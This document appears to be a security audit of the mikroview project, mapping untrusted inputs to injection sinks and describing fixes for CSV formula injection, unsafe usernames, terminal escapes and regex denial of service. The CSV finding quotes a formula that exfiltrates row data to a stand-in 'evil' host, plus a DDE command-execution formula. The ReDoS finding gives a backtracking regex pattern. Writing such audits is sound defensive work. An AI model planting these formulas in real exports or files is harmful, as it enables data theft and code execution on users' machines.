# Injection audit: every field, every sink

Date: 2026-08-07. Scope: all untrusted input reaching mikroview, and
what each one is eventually interpreted as.

Method: map inputs to *sinks* rather than auditing fields in isolation.
A field is only dangerous where something interprets it — a shell, a
query planner, a browser, a spreadsheet, a terminal. So the question
asked of every input was "what eventually parses this, and does that
parser have a control plane the value could reach?"

## Sinks that don't exist here

Worth recording, because their absence is what makes most of the
classic injection classes inapplicable rather than mitigated:

| Class | Status |
|---|---|
| SQL injection | No SQL. The event store is an in-memory ring; `Query` is struct-field comparison, not a query language. Postgres (#131) will need this revisited. |
| Command injection | No `os/exec` anywhere in the module. |
| XSS | No `{@html}`, `innerHTML`, `eval`, or `new Function`. Svelte escapes interpolated text by default, so untrusted event data renders as text. |
| Path traversal | Static assets are served by `http.FileServer(http.FS(embed.FS))`; net/http cleans and rejects traversal before the FS sees a path. |
| Open redirect / header injection | The only user-influenced redirect is `?ssoError=<code>`, and `code` is one of eight compile-time constants. |
| SMTP header injection | Subject is fixed text; `From`/`To` are operator config, not request data. Flag content goes in the body, after `CRLFCRLF`, and Go's `textproto.DotWriter` handles dot-stuffing. |
| Server-side ReDoS | Go's `regexp` is RE2 — no backtracking, linear in input. |

## Findings, and what was done

### 1. CSV formula injection in Export — fixed

`frontend/src/lib/export.ts` quoted correctly for CSV and neutralised
nothing. Almost every exported column originates outside mikroview:
`raw` is the syslog line verbatim, `ruleLabel` is router configuration,
the hostname columns come from naming/DNS.

A cell beginning `=`, `+`, `-`, `@`, tab or CR is a formula to Excel,
LibreOffice and Sheets. `=IMPORTXML("http://evil/?d="&A1,"//a")`
exfiltrates the surrounding row on open; `=cmd|'/C calc'!A0` is DDE
execution.

Quoting is not a defence — the spreadsheet unquotes before deciding.
The fix prefixes an apostrophe, which survives unquoting and is not
displayed. Same defect as CVE-2025-62417 (Bagisto), CVE-2025-55745
(UnoPim), CVE-2026-39424 (MaxKB).

### 2. No username validation — fixed

`internal/auth` accepted any string as a username, at any length, from
both local registration and OIDC provisioning. The OIDC path is the
sharp one: the name comes from the identity provider's
`preferred_username`/`email` claim, which this deployment does not
control.

That name is then written to the audit trail, printed to a terminal by
`-list-users`, and rendered in the admin's account list. Three
consequences:

- An ANSI escape is executed by the operator's terminal, so
  `-list-users` can be made to display a different set of accounts than
  it read. This is CVE-2025-55754 (Tomcat) and CVE-2025-48432 (Django).
- A newline forges an extra line in the audit trail.
- A bidi override (U+202E and friends) makes an account render as
  another account's name, in the one screen whose job is telling the
  admin who holds access.

`ValidateUsername` now rejects control characters, Unicode format
characters, surrounding whitespace, and anything outside 1–64 runes.
Non-ASCII names remain valid — refusing everyone whose name isn't ASCII
is not a security measure.

For OIDC the hint is *dropped*, not rejected: the person has already
authenticated, and failing their login over a claim they can't change
would lock out someone who did nothing wrong. They get the deterministic
`oidc-<hash>` fallback name instead.

### 3. Terminal output not sanitised — fixed

Validation only protects accounts created from now on. Anything already
stored, or arriving from an IdP, still reaches the terminal. Added
`logging.Printable`, applied at the CLI print sites and to usernames in
log messages.

Note `%q` already escapes control characters, so the `fmt.Printf("%q")`
sites were safe; only `%s` needed it.

### 4. Client-side ReDoS via the rule regex filter — mitigated

`applyFilters` compiles a user-supplied pattern with JavaScript's
`RegExp`, a backtracking engine, and runs it over up to 5,000 buffered
events. Filters are seeded from the URL at startup
(`filtersFromSearchParams`), so the pattern isn't necessarily one the
operator typed — a link is the delivery vector.

Measured: a single `test()` of `(a+)+$` against a 30-character
non-matching string does not finish in 60 seconds.

`isSafeRulePattern` rejects a quantified group whose body itself
contains a quantifier or an alternation. It's a structural scan, not a
regex applied to the pattern, because the dangerous property is
nesting — `((ab)+){2,}` walks straight past a character-class approach.

**This is a mitigation, not a proof.** It blocks the constructs that
make exponential backtracking possible; it does not establish that the
accepted patterns are fast. A guarantee needs a non-backtracking engine
(RE2 via WASM) or matching inside a terminable Worker. Both are heavier
than the risk justifies: a recoverable hang of the recipient's own tab,
no data disclosure, no effect on other users. Revisit if the filter ever
runs anywhere shared.

### 5. Entity key/label/tags unvalidated — fixed

Same class as the username, lower severity because setting an entity is
admin-only. But an entity `Key` can come from a discovered rule label,
which originates in syslog, and labels reach both the audit trail and —
via the naming resolver — the CSV export. Now held to the same
no-control-characters rule, capped at 256 runes.

## Residual risk

- The ReDoS screen is heuristic (see 4).
- Accounts and entities stored before this change are not retroactively
  validated. Output sanitising covers the terminal path; the UI escapes
  by default. A migration that renames offending accounts was considered
  and rejected — silently renaming someone's account is worse than
  displaying it safely.
- Postgres (#131) introduces a query planner, the first real SQL sink.
  Parameterised queries throughout, and this document updated, before
  that ships.
